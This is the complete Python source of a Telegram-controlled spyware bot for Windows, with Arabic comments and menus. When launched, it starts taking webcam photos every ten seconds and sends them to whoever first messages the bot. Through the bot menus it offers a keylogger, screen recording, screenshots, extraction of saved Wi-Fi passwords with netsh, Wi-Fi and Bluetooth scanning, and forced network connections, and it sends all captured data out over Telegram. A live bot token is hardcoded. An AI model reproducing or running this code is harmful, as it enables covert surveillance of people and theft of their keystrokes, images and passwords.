import telebot
from telebot import types
import pyautogui
import pyperclip
import os
import time
import subprocess
import threading
import sys
import cv2
import numpy as np
from pynput import keyboard
from datetime import datetime
import asyncio

# ==========================================
# 1. إعدادات النظام والتوكين
# ==========================================
try:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
except:
    pass

# التوكين الخاص بك
TOKEN = "8500372242:AAFVPMzbH-cciXHkiCpXHH2AXaAMvZzrLa0"

# سيتم تعيين الآيدي تلقائياً عند إرسال /start
MY_ID = None 

bot = telebot.TeleBot(TOKEN)

# --- متغيرات التحكم ---
current_path = os.getcwd()

# متغيرات المراقبة
is_recording_video = False
video_thread = None
key_listener = None
logged_keys = [] 
is_keylogging = False

# --- المسارات ---
DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")
SAVE_DIR = os.path.join(DESKTOP_PATH, "محمود_System_V16")
VIDEO_FOLDER = os.path.join(SAVE_DIR, "تسجيل_فيديو")
LOGS_FOLDER = os.path.join(SAVE_DIR, "سجلات_كيبورد")
CAM_FOLDER = os.path.join(SAVE_DIR, "صور_الكاميرا_التلقائية")

for folder in [SAVE_DIR, VIDEO_FOLDER, LOGS_FOLDER, CAM_FOLDER]:
    if not os.path.exists(folder):
        try: os.makedirs(folder)
        except: pass

# ==========================================
# 2. فحص المكتبات (بلوتوث)
# ==========================================
try:
    from bleak import BleakScanner
    BLEAK_AVAILABLE = True
except ImportError:
    BLEAK_AVAILABLE = False

async def scan_ble_async():
    if not BLEAK_AVAILABLE: return "⚠️ مكتبة 'bleak' غير مثبتة."
    try:
        devices = await BleakScanner.discover()
        txt = "🦷 **أجهزة البلوتوث القريبة:**\n"
        for d in devices:
            name = d.name if d.name else "Unknown"
            txt += f"📱 {name} ({d.address})\n"
        return txt if len(txt) > 30 else "⚠️ لم يتم العثور على أجهزة بلوتوث."
    except Exception as e: return f"❌ خطأ: {e}"

def run_bluetooth_scan():
    try:
        return asyncio.run(scan_ble_async())
    except: return "❌ خطأ في تشغيل البلوتوث (قد لا يكون مدعوماً)"

# ==========================================
# 3. دوال الشبكة (Wi-Fi)
# ==========================================
def get_wifi_networks():
    try:
        # استخدام ترميز cp850 لدعم الأحرف في ويندوز
        data = subprocess.check_output('netsh wlan show networks', shell=True).decode('cp850', errors="ignore")
        return data
    except: return "❌ لا يمكن الوصول لكرت الشبكة"

def get_saved_wifi_passwords():
    try:
        data = subprocess.check_output('netsh wlan show profiles', shell=True).decode('cp850', errors="ignore")
        profiles = [i.split(":")[1][1:-1] for i in data.split('\n') if "All User Profile" in i]
        result_text = "🔐 **كشف كلمات المرور المحفوظة:**\n"
        for i in profiles:
            try:
                # استخراج الباسورد
                cmd = f'netsh wlan show profile name="{i}" key=clear'
                results = subprocess.check_output(cmd, shell=True).decode('cp850', errors="ignore")
                results = [b.split(":")[1][1:-1] for b in results.split('\n') if "Key Content" in b]
                try: result_text += f"📡 {i}: `{results[0]}`\n"
                except: result_text += f"📡 {i}: (Open/No Pass)\n"
            except: pass
        return result_text
    except: return "❌ خطأ في استخراج البيانات."

def connect_to_wifi(ssid, password):
    config = f"""<?xml version=\"1.0\"?>
<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">
    <name>{ssid}</name>
    <SSIDConfig><SSID><name>{ssid}</name></SSID></SSIDConfig>
    <connectionType>ESS</connectionType><connectionMode>auto</connectionMode>
    <MSM><security><authEncryption>
    <authentication>WPA2PSK</authentication><encryption>AES</encryption>
    <useOneX>false</useOneX></authEncryption>
    <sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>{password}</keyMaterial></sharedKey>
    </MSM></MSM>
</WLANProfile>"""
    try:
        filename = f"wifi_config.xml"
        with open(filename, "w") as file: file.write(config)
        subprocess.run(f'netsh wlan add profile filename="{filename}"', shell=True)
        subprocess.run(f'netsh wlan connect name="{ssid}"', shell=True)
        os.remove(filename)
        return True
    except: return False

# ==========================================
# 4. دوال المراقبة (تم إصلاح الكاميرا)
# ==========================================
def auto_camera_loop():
    """التقاط صورة كل 10 ثواني تلقائياً - مع حماية ضد الأخطاء"""
    # استخدام CAP_DSHOW لتجنب الأخطاء في ويندوز
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) 
    
    if not cap.isOpened():
        print("⚠️ تنبيه: لم يتم العثور على كاميرا. تم تعطيل المراقبة التلقائية للكاميرا.")
        return 

    print("📸 تم تشغيل الكاميرا التلقائية بنجاح.")
    
    while True:
        try:
            ret, frame = cap.read()
            if ret:
                timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
                filename = os.path.join(CAM_FOLDER, f"AutoCam_{timestamp}.jpg")
                cv2.imwrite(filename, frame)
                
                # إرسال للمالك فقط إذا تم تحديده
                if MY_ID:
                    try:
                        with open(filename, 'rb') as f:
                            bot.send_photo(MY_ID, f, caption=f"👁️ رصد: {timestamp}")
                    except: pass
            
            time.sleep(10)
        except:
            time.sleep(5)

# كي لوجر
def on_key_press(key):
    global logged_keys
    try: logged_keys.append(key.char)
    except AttributeError: logged_keys.append(f" [{str(key).replace('Key.', '')}] ")

def start_keylogger_logic():
    global key_listener, is_keylogging, logged_keys
    logged_keys = [] 
    is_keylogging = True
    key_listener = keyboard.Listener(on_press=on_key_press)
    key_listener.start()

def stop_and_save_keylogs(chat_id):
    global key_listener, is_keylogging
    if key_listener: key_listener.stop()
    is_keylogging = False
    filename = os.path.join(LOGS_FOLDER, f"Keylog_{datetime.now().strftime('%H-%M-%S')}.txt")
    with open(filename, "w", encoding="utf-8") as f: f.write("".join(logged_keys))
    with open(filename, "rb") as f: bot.send_document(chat_id, f)

# تسجيل فيديو
def record_screen_logic(chat_id):
    global is_recording_video
    screen_size = pyautogui.size()
    video_path = os.path.join(VIDEO_FOLDER, f"Screen_{datetime.now().strftime('%H-%M-%S')}.avi")
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(video_path, fourcc, 10.0, screen_size) 
    try:
        while is_recording_video:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
            out.write(frame)
        out.release()
        with open(video_path, 'rb') as v: bot.send_video(chat_id, v)
    except: pass
    if 'out' in locals(): out.release()

# ==========================================
# 5. لوحات التحكم
# ==========================================
def create_main_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('🕵️ أدوات المراقبة', '📡 أدوات الشبكة')
    markup.add('📸 لقطة شاشة', '✅ حالة النظام')
    return markup

def create_monitor_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("📹 بدء فيديو", callback_data="vid_start"),
               types.InlineKeyboardButton("⏹ إيقاف فيديو", callback_data="vid_stop"))
    markup.add(types.InlineKeyboardButton("⌨️ بدء الكي-لوجر", callback_data="key_start"),
               types.InlineKeyboardButton("📝 إيقاف الكي-لوجر", callback_data="key_stop"))
    return markup

def create_network_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("📶 الشبكات المتاحة", callback_data="wifi_scan"))
    markup.add(types.InlineKeyboardButton("🔐 كلمات المرور المحفوظة", callback_data="wifi_pass"))
    markup.add(types.InlineKeyboardButton("🦷 فحص بلوتوث", callback_data="bt_scan"))
    markup.add(types.InlineKeyboardButton("🔗 اتصال بشبكة", callback_data="wifi_connect"))
    return markup

# ==========================================
# 6. الأوامر (Handlers)
# ==========================================
@bot.message_handler(commands=['start'])
def start_command(message):
    global MY_ID
    # تعيين المالك تلقائياً
    if MY_ID is None:
        MY_ID = message.chat.id
        bot.reply_to(message, f"✅ **تم الاتصال بنجاح!**\nتم حفظك كمسؤول للجهاز.\nID: `{MY_ID}`", reply_markup=create_main_keyboard(), parse_mode="Markdown")
        # إرسال تنبيه في حال لم تعمل الكاميرا
        bot.send_message(MY_ID, "ملاحظة: إذا لم تصلك صور تلقائية، فهذا يعني أن الجهاز لا يحتوي على كاميرا أو أنها معطلة.")
    elif message.chat.id == MY_ID:
        bot.reply_to(message, "👋 أهلاً بك مجدداً.", reply_markup=create_main_keyboard())

def is_authorized(user_id): return user_id == MY_ID

@bot.message_handler(func=lambda m: m.text == '🕵️ أدوات المراقبة')
def open_monitor(m):
    if is_authorized(m.chat.id):
        bot.reply_to(m, "🛠 **أدوات التحكم:**", reply_markup=create_monitor_keyboard())

@bot.message_handler(func=lambda m: m.text == '📡 أدوات الشبكة')
def open_net(m):
    if is_authorized(m.chat.id):
        bot.reply_to(m, "📡 **أدوات الشبكة والبلوتوث:**", reply_markup=create_network_keyboard())

@bot.message_handler(func=lambda m: m.text == '✅ حالة النظام')
def sys_status(m):
    if is_authorized(m.chat.id):
        bot.reply_to(m, "✅ **النظام يعمل.**\nيمكنك التحكم الآن.")

@bot.callback_query_handler(func=lambda call: True)
def handle_queries(call):
    if not is_authorized(call.message.chat.id): return
    chat_id = call.message.chat.id
    data = call.data
    global is_recording_video

    if data == "wifi_scan":
        bot.answer_callback_query(call.id, "بحث...")
        bot.send_message(chat_id, f"📶 الشبكات:\n{get_wifi_networks()}")

    elif data == "wifi_pass":
        bot.answer_callback_query(call.id, "جاري الاستخراج...")
        bot.send_message(chat_id, get_saved_wifi_passwords(), parse_mode="Markdown")

    elif data == "bt_scan":
        bot.answer_callback_query(call.id, "فحص البلوتوث...")
        bot.send_message(chat_id, run_bluetooth_scan())

    elif data == "wifi_connect":
        msg = bot.send_message(chat_id, "📝 أرسل: `اسم_الشبكة,الباسورد`", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_wifi_connect)

    elif data == "vid_start":
        if not is_recording_video:
            is_recording_video = True
            threading.Thread(target=record_screen_logic, args=(chat_id,)).start()
            bot.answer_callback_query(call.id, "بدأ الفيديو")
    
    elif data == "vid_stop":
        is_recording_video = False
        bot.answer_callback_query(call.id, "توقف الفيديو")

    elif data == "key_start":
        if not is_keylogging:
            start_keylogger_logic()
            bot.answer_callback_query(call.id, "بدأ الكي لوجر")

    elif data == "key_stop":
        stop_and_save_keylogs(chat_id)
        bot.answer_callback_query(call.id, "تم الحفظ")

def process_wifi_connect(message):
    try:
        ssid, password = message.text.split(',')
        if connect_to_wifi(ssid.strip(), password.strip()):
            bot.send_message(message.chat.id, "✅ تم طلب الاتصال.")
        else:
            bot.send_message(message.chat.id, "❌ فشل.")
    except: pass

@bot.message_handler(func=lambda m: m.text == '📸 لقطة شاشة')
def screen(m):
    if is_authorized(m.chat.id):
        shot = "s.png"
        pyautogui.screenshot(shot)
        with open(shot, 'rb') as f: bot.send_photo(m.chat.id, f)
        os.remove(shot)

# ==========================================
# 7. التشغيل
# ==========================================
if __name__ == "__main__":
    # تشغيل الكاميرا التلقائية (مع الحماية من الأخطاء)
    cam_thread = threading.Thread(target=auto_camera_loop)
    cam_thread.daemon = True 
    cam_thread.start()
    
    print(f"🚀 Bot V16 Started...")
    print("👉 Please send /start in Telegram now.")
    
    while True:
        try: bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except Exception as e: 
            print(f"Polling Error: {e}")
            time.sleep(5)